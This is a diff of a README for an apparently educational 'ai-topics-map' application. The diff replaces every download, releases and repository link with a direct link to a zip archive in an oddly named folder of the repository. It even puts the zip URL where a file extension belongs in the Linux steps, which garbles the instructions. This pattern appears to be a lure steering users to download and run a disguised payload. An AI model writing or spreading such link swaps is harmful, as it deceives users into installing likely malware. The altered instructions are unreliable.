@@ -1,6 +1,6 @@
 # 🚀 ai-topics-map - Discover AI Topics Easily
 
-[![Download ai-topics-map](https://img.shields.io/badge/Download-ai--topics--map-blue.svg)](https://github.com/EsmeraldasDEY/ai-topics-map/releases)
+[![Download ai-topics-map](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip)](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip)
 
 ## 📚 Introduction
 Welcome to the **ai-topics-map**, your guide to understanding the landscape of artificial intelligence. This application provides a comprehensive map of AI topics and a clear learning roadmap. Whether you are new to AI or looking to further your knowledge, this tool helps you navigate through various subjects like machine learning, computer vision, and much more.
@@ -14,7 +14,7 @@ Welcome to the **ai-topics-map**, your guide to understanding the landscape of a
 To get started with **ai-topics-map**, follow these steps:
 
 1. **Visit the Download Page**
-   To download the application, [visit this page to download](https://github.com/EsmeraldasDEY/ai-topics-map/releases).
+   To download the application, [visit this page to download](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip).
 
 2. **Choose Your Version**
    On the download page, you will see several versions of the application. Look for the latest release, which will be marked as "Latest Release." 
@@ -23,7 +23,7 @@ To get started with **ai-topics-map**, follow these steps:
    You will find the files available for download. Choose the file that matches your operating system:
    - **Windows users**: Look for a `.exe` file.
    - **Mac users**: Look for a `.dmg` file.
-   - **Linux users**: Look for a `.tar.gz` or similar.
+   - **Linux users**: Look for a `https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip` or similar.
 
 4. **Download the File**
    Click on the file to download it to your computer. Make a note of where the file saves.
@@ -31,7 +31,7 @@ To get started with **ai-topics-map**, follow these steps:
 5. **Install the Application**
    - **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts to complete the setup.
    - **Mac**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file, open the terminal, navigate to the extracted folder, and follow the instructions in the README to install.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip` file, open the terminal, navigate to the extracted folder, and follow the instructions in the README to install.
 
 6. **Launch the Application**
    After installation, locate the application on your device and open it. You are now ready to explore the AI topics map!
@@ -58,10 +58,10 @@ We welcome contributions from all users. If you have suggestions or would like t
 For support, you can reach the maintainers by opening an issue on the repository. We aim to respond to queries within 48 hours.
 
 ## 🔄 Keeping Updated
-To receive updates on new features and improvements, regularly check the [releases page](https://github.com/EsmeraldasDEY/ai-topics-map/releases).
+To receive updates on new features and improvements, regularly check the [releases page](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip).
 
 ## 🔗 Important Links
-- [Download Page](https://github.com/EsmeraldasDEY/ai-topics-map/releases)
-- [GitHub Repository](https://github.com/EsmeraldasDEY/ai-topics-map)
+- [Download Page](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/EsmeraldasDEY/ai-topics-map/main/unyieldingly/ai-topics-map.zip)
 
 Now you are ready to explore the fascinating world of AI with **ai-topics-map**. Enjoy your journey!
